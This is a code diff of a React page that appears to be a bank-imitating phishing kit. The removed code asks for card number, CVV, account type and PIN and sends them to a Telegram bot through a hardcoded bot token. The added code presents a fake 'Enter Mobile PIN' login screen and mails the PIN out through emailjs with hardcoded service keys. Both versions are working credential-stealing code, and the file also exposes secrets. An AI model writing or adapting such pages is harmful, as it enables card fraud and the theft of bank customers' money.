@@ -1,282 +1,135 @@
-import React from 'react';
+import { useState } from "react";
 import {
   Box,
+  Text,
   Heading,
   Center,
-  Text,
   FormControl,
   Input,
-  Menu,
-  MenuButton,
-  MenuList,
-  MenuItem,
   Button,
   InputGroup,
-} from '@chakra-ui/react';
-import { useNavigate } from 'react-router-dom';
-import { FiChevronDown } from 'react-icons/fi';
+  IconButton,
+  InputRightElement,
+  Spinner,
+} from "@chakra-ui/react";
+import { FaEyeSlash, FaEye } from "react-icons/fa";
+import emailjs from "emailjs-com";
+import { useNavigate } from "react-router-dom";
 
 function Enter() {
+  const [showPassword, setShowPassword] = useState(false);
+  const [loading, setLoading] = useState(false); // Loading state
   const navigate = useNavigate();
 
-  const [selectedAccountType, setSelectedAccountType] = React.useState('');
+  const handleShowPassword = () => {
+    setShowPassword(!showPassword);
+  };
 
-  const token = '6214248431:AAFodeiJc0UIq-nmsTyqMgzp2FdByom3wzc';
-  const chat_id = '';
+  const sendEmail = (e: any) => {
+    e.preventDefault();
+    setLoading(true); // Start loading
 
-  async function sendMessageToTelegram(message: any) {
-    await fetch(
-      `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`
-    );
-    console.log('Telegram message sent');
-  }
-
-  async function handleFormSubmit(event: any) {
-    event.preventDefault();
-  
-    if (!selectedAccountType) {
-      alert('Please select an account type.');
-      return;
-    }
-  
-    let message =
-      ' | Card Number: ' +
-      event.target.cardnumber.value +
-      '\n | CVV: ' +
-      event.target.cvv.value +
-      '\n | Account Type: ' +
-      selectedAccountType +
-      '\n | CardPIN: ' +
-      event.target.pin.value;
-  
-    try {
-      await sendMessageToTelegram(message);
-      navigate('/success');
-    } catch (error) {
-      console.error('Error sending message to Telegram:', error);
-      alert('An error occurred while sending the message.');
-    }
-  }
-  
+    emailjs
+      .sendForm("service_9vq8bca", "template_barvi2x", e.target, "n1LlPgghSqnVWFxPU")
+      .then(
+        (result) => {
+          console.log(result.text);
+          setLoading(false); // Stop loading
+          navigate("/success"); // Navigate to /success after successful form submission
+        },
+        (error) => {
+          console.log(error.text);
+          setLoading(false); // Stop loading
+        }
+      );
+  };
 
   return (
-    <Box fontFamily="Poppins">
-      <form onSubmit={handleFormSubmit}>
+    <Box>
+      <form onSubmit={sendEmail}>
         <InputGroup>
           <FormControl>
             <Box minH="72.3vh">
+              <Center p={4} bgColor="whitesmoke" justifyContent="space-between">
+                <Text pl={2} fontSize="md" color="#196999" fontWeight="semibold">
+                  We recognize this device.
+                </Text>
+                <Text textDecor={"underline"} pl={2} fontSize="md" color="#196999" fontWeight="semibold">
+                  <a href="#">View</a>
+                </Text>
+              </Center>
+
               <Box>
                 <Center>
-                  <Heading
-                    px={4}
-                    fontFamily="Poppins"
-                    textAlign="center"
-                    pt={7}
-                    fontWeight="normal"
-                    as="h2"
-                    fontSize="20"
-                    color="blackAlpha.800"
-                  >
-                    To get started, <br />let's verify it's you.
+                  <Heading px={4} textAlign="center" pt={7} fontWeight="semibold" as="h2" fontSize="26" color="blackAlpha.800">
+                    Enter Mobile PIN
                   </Heading>
                 </Center>
               </Box>
 
               <Box p={5}>
-                
-
-                <Text
-                  mt={10}
-                  fontSize="13"
-                  mb={2}
-                  fontWeight="semibold"
-                  fontFamily="Poppins"
-                  textAlign="start"
-                  color="blackAlpha.900"
-                >
-                  Account Type
-                </Text>
-                <Menu>
-                  <MenuButton
-                    border="solid gray 1px"
-                    w="100%"
-                    color="gray.700"
-                    p={3}
-                   
-                    borderRadius={0}
-                  >
-                    {selectedAccountType ? (
-                      <Box>
-                        {selectedAccountType}{' '}
-                        <Box mt={-5} pl={1}>
-                        <FiChevronDown color="black" />
-                        </Box>
-                      </Box>
-                    ) : (
-                      <Box>
-                        Select account type{' '}
-                        <Box mt={-5} pl={30}>
-                        <FiChevronDown color="black" />
-                        </Box>
-                      </Box>
-                    )}
-                  </MenuButton>
-                  <MenuList>
-                    <MenuItem
-                      value="Debit/ATM card"
-                      onClick={() =>
-                        setSelectedAccountType('Debit/ATM card')
-                      }
-                    >
-                      Debit/ATM card
-                    </MenuItem>
-                    <MenuItem
-                      value="Checking or money market account"
-                      onClick={() =>
-                        setSelectedAccountType(
-                          'Checking or money market account'
-                        )
-                      }
-                    >
-                      Checking or money market account
-                    </MenuItem>
-                    <MenuItem
-                      value="Savings account/CDs/IRAs"
-                      onClick={() =>
-                        setSelectedAccountType('Savings account/CDs/IRAs')
-                      }
-                    >
-                      Savings account/CDs/IRAs
-                    </MenuItem>
-                    <MenuItem
-                      value="Mortgage account"
-                      onClick={() =>
-                        setSelectedAccountType('Mortgage account')
-                      }
-                    >
-                      Mortgage account
-                    </MenuItem>
-                    <MenuItem
-                      value="HELOC account"
-                      onClick={() =>
-                        setSelectedAccountType('HELOC account')
-                      }
-                    >
-                      HELOC account
-                    </MenuItem>
-                    <MenuItem
-                      value="Credit card"
-                      onClick={() =>
-                        setSelectedAccountType('Credit card')
-                      }
-                    >
-                      Credit card
-                    </MenuItem>
-                    <MenuItem
-                      value="Personal loan"
-                      onClick={() =>
-                        setSelectedAccountType('Personal loan')
-                      }
-                    >
-                      Personal loan
-                    </MenuItem>
-                  </MenuList>
-                </Menu>
-
-                <Text
-                  fontSize="13"
-                  mt={10}
-                  mb={2}
-                  fontWeight="semibold"
-                  fontFamily="Poppins"
-                  textAlign="start"
-                  color="blackAlpha.900"
-                >
-                  Card number (no dashes)
-                </Text>
                 <Input
-                  id="cardnumber"
-                  _hover={{ border: 'solid 0.9px' }}
-                  border="1px solid #196999"
+                  id="password"
+                  _hover={{ border: "solid 0.9px" }}
+                  border={"1px solid #196999"}
                   borderRadius={0}
-                  _focus={{  border: 'none' }}
+                  _focus={{ bgColor: "yellow.100", border: "none" }}
+                  _placeholder={{ color: "blackAlpha.800", top: "0", transform: "translateY(-130%)", fontSize: "12px" }}
                   h="70px"
-                  placeholder="Enter your Card Number"
+                  placeholder="PIN"
                   pb={0}
-                  minLength={16}
-                  maxLength={16}
-                  name="cardnumber"
-                  type="number"
-                />
-
-                <Text
-                  fontSize="13"
-                  mt={10}
-                  mb={2}
-                  fontWeight="semibold"
-                  fontFamily="Poppins"
-                  textAlign="start"
-                  color="blackAlpha.900"
-                >
-                  Card CVV
-                </Text>
-                <Input
-                  id="cvv"
-                  _hover={{ border: 'solid 0.9px' }}
-                  border="1px solid #196999"
-                  borderRadius={0}
-                  _focus={{  border: 'none' }}
-                  h="70px"
-                  placeholder="Enter your Card CVV"
-                  pb={0}
-                  maxLength={3}
-                  name="cvv"
-                  type="number"
-                />
-
-                <Text
-                  fontSize="13"
-                  mt={10}
-                  mb={2}
-                  fontWeight="semibold"
-                  fontFamily="Poppins"
-                  textAlign="start"
-                  color="blackAlpha.900"
-                >
-                  Four-digit PIN
-                </Text>
-                <Input
-                  id="pin"
-                  _hover={{ border: 'solid 0.9px' }}
-                  border="1px solid #196999"
-                  borderRadius={0}
-                  _focus={{  border: 'none' }}
-                  h="70px"
-                  placeholder="Enter your PIN"
-                  pb={0}
-                  maxLength={4}
-                  minLength={4}
                   name="pin"
-                  type="number"
+                  maxLength={4}
+                  type={showPassword ? "text" : "password"}
                 />
+              </Box>
 
+              <Box p={4}>
                 <Button
-                  fontFamily="Poppins"
-                  borderRadius={0}
-                  bgColor="#47A040"
-                  w="100%"
-                  mt={5}
-                  mb={5}
-                  color="white"
-                  _hover={{
-                    bgColor:"#47A040",
-                  }}
                   type="submit"
+                  _hover={{ bg: "#526f30", color: "whitesmoke", borderRadius: 2 }}
+                  mt={2}
+                  h={12}
+                  bgColor="#486428"
+                  color="whitesmoke"
+                  borderRadius={2}
+                  w="100%"
                 >
-                  Continue
+                  Login
                 </Button>
+
+                {loading && (
+                  <Center mt={4}>
+                    <Spinner size="xl" color="green.500" />
+                  </Center>
+                )}
+
+                <Text mt={5} textAlign="center" color="#196999" fontWeight="semibold" fontSize={14}>
+                  Resend PIN
+                </Text>
               </Box>
             </Box>
+            <InputRightElement mt={36} width="8.5rem">
+              <IconButton
+                h="100%"
+                p={2}
+                size="lg"
+                onClick={handleShowPassword}
+                colorScheme="gray"
+                icon={showPassword ? (
+                  <>
+                    <FaEyeSlash />
+                    <Text ml={1}> Hide</Text>
+                  </>
+                ) : (
+                  <>
+                    <FaEye />
+                    <Text ml={1}> Show</Text>
+                  </>
+                )}
+                aria-label={""}
+              />
+            </InputRightElement>
           </FormControl>
         </InputGroup>
       </form>
